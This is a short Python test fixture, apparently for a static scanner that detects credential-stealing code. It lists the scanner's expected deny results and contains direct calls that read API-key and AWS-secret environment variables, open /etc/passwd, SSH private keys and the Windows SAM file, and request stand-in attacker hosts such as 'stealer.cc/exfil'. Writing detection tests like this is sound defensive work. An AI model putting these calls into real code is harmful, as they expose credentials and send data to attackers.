#!/usr/bin/env python3
"""
evasion-01-direct.py — 直接调用（基线测试）
参考事件: 通用恶意软件凭证窃取
严重等级: 高
拦截方式: 静态扫描直接检出字符串字面量
  check_domain("evil.com")      → DENY (域名黑名单)
  check_env("OPENAI_API_KEY")   → DENY (环境变量模式)
  check_path("/etc/passwd")     → DENY (文件路径黑名单)
"""

import os, requests

def direct_calls():
    os.environ.get("OPENAI_API_KEY")
    os.getenv("AWS_SECRET_ACCESS_KEY")
    open("/etc/passwd")
    open(os.path.expanduser("~/.ssh/id_rsa"))
    requests.get("https://evil.com")
    requests.post("https://stealer.cc/exfil")
    open("C:\\Windows\\System32\\config\\SAM")
